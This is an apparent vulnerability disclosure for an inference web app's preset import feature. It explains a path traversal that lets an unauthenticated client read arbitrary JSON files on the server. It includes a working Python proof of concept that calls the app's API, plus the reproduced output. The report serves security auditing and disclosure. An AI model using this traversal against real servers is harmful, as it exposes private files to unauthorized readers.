# FD-002: Imported preset key traversal reads arbitrary JSON

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
Imported preset JSON keys become dropdown choices; selecting a traversal key makes `update_sliders` in `inference.py:143-147` call `open(os.path.join(PRESETS_DIR, f"{preset}.json"))` on the attacker-chosen path.

## Impact
Unauthenticated client reads the contents of any JSON file on the server via a two-step interaction (import + select).

## PoC
```python
evil = {"../../poc/FD002_victim": {"pitch": 99}}  # victim JSON has pitch=12
r = c.predict(file_path=handle_file(evil_preset), api_name="/import_presets_button_1")
hit = [x for x in r if "FD002_victim" in str(x)][0]
r2 = c.predict(preset=hit, api_name="/update_sliders_1")  # returns victim's pitch=12
```

## Execution result
```
[FD-002] {"verdict": "REPRODUCED", "traversal_key_accepted": true, "victim_values_returned": true}
```
